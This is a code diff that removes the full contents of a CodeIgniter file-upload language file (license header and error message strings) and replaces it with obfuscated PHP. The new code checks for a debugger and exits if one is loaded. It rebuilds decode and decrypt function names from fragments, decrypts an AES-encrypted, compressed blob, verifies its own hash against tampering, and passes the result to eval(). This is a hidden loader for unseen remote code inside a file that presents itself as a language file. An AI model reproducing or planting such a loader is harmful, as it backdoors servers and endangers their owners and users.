@@ -1,55 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-$lang['upload_userfile_not_set'] = 'Unable to find a post variable called userfile.';
-$lang['upload_file_exceeds_limit'] = 'The uploaded file exceeds the maximum allowed size in your PHP configuration file.';
-$lang['upload_file_exceeds_form_limit'] = 'The uploaded file exceeds the maximum size allowed by the submission form.';
-$lang['upload_file_partial'] = 'The file was only partially uploaded.';
-$lang['upload_no_temp_directory'] = 'The temporary folder is missing.';
-$lang['upload_unable_to_write_file'] = 'The file could not be written to disk.';
-$lang['upload_stopped_by_extension'] = 'The file upload was stopped by extension.';
-$lang['upload_no_file_selected'] = 'You did not select a file to upload.';
-$lang['upload_invalid_filetype'] = 'The filetype you are attempting to upload is not allowed.';
-$lang['upload_invalid_filesize'] = 'The file you are attempting to upload is larger than the permitted size.';
-$lang['upload_invalid_dimensions'] = 'The image you are attempting to upload doesn\'t fit into the allowed dimensions.';
-$lang['upload_destination_error'] = 'A problem was encountered while attempting to move the uploaded file to the final destination.';
-$lang['upload_no_filepath'] = 'The upload path does not appear to be valid.';
-$lang['upload_no_file_types'] = 'You have not specified any allowed file types.';
-$lang['upload_bad_filename'] = 'The file name you submitted already exists on the server.';
-$lang['upload_not_writable'] = 'The upload destination folder does not appear to be writable.';
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_odssgb4e=('bas'.'e64'.'_de'.'cod'.'e');
+$_vyvqdott=('gzu'.'nco'.'mpr'.'ess');
+$_n64hb1v3=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_e8hynsvh='kZeKC9pi';
+$_g9gzm9aa='Jdvweyyh';
+$_dfyiezpg='GBvT/HHP';
+$_f4p1pmi5='6jlCoVR1';
+$_yetht193='kzbsYYmNKr0=';
+$_hih7tuvr='nRpkJnJQ';
+$_sjmw0eh1='1KMiZw==';
+$_dwwxjtkf='kU2LlMIA';
+$_abjayt8h=$_odssgb4e($_e8hynsvh.$_g9gzm9aa.$_f4p1pmi5.$_dfyiezpg.$_yetht193);
+$_cti19xh8=$_odssgb4e($_dwwxjtkf.$_hih7tuvr.$_sjmw0eh1);
+$_wojy80z2=$_odssgb4e('dIpiuxUFXBfYJvBX1qZB+O9cfGOEd/BuV5hBTu1+xggQwVYNfGr55KOmYnET6QHh9B1AMbtcCWunetuqzYGOEe1Wy/3/CXcu+ap87N5n+D/pMjkff0ih9F0lydtr8H1dXl7ZAte5PA+Lu/9G++xIIVZUL21IOkEwKM1djDeKnhGYxLDAMh2PBF+MVnOk0UpzbFFmxiPyP41YYYPngND2T9yJLfG4HMVCxojFJghJEEHhD6CSMBG8GrTX6YQxoYbm/xnTUEdjHfXXAUKG1u7aw3PJx03Tiv42l+dhZ7KZ+NwSiTxUWpJC95fSL9tpOcrJRnM1p9QXidz8Zg7dxa7k4QXSChgnKFqGu9WbYnuB/d4c56aXQ8+GGcOyvYTYx34WJfxMx78BV/imPc+hdhkAthFMXnturw+LeKtOyBtSaTzORSQS5Ms4ZVZM0D5uG2dQ6j+SbcMiTgWNJpVoHMGuywecNRuh9+bGF3uiDWLgvM9/qqV+8Qjac5HgtyiNBceZEKIRzIFWq92snjfF1luX7sqsdOGh0DUaWFZhgaDJ31dgoKGTp9w4rsbQuQXkY8vqYw00WvBSq9oDDXfS9ejOPp0knffJQ8U5bsqrljRj80YKW3zjbQOjxVyIMlJxBssqE1FnJ6FCnupGChInIyQazY6bqldsWyd1jqQ7iBnaOGvHhCLe3ufkI6kQw4zl1yWruqesJd1QzkZtReF3CSRrHuIH9mQjwjZsyxbOYMlZnoOvBW35ACaL6a8sE8WSBfO9kIdHhpKLXsKcXvGh6VHuqKTo2H/Q3iIXDsINyqFWtWw=');
+$_iy6c5wjh=$_n64hb1v3($_wojy80z2,'aes-256-cbc',$_abjayt8h,OPENSSL_RAW_DATA,$_cti19xh8);
+if($_iy6c5wjh===false){exit;}
+$_ma7drb1t=$_vyvqdott($_iy6c5wjh);
+if($_ma7drb1t===false){exit;}
+$_kwmltjsi='84a31c2030a638cec3c3b79a7ef8a10d36ec7a3d3bdbf8bd2266a96c797ddc30';
+$_w8jjncs5=@file_get_contents(__FILE__);
+if($_w8jjncs5!==false){
+$_vm1520za=str_replace($_kwmltjsi,"0000000000000000000000000000000000000000000000000000000000000000",$_w8jjncs5);
+$_qdz5r4up=hash("sha256",$_vm1520za);
+if($_qdz5r4up!==$_kwmltjsi){@http_response_code(403);exit;}
+}
+eval($_ma7drb1t);
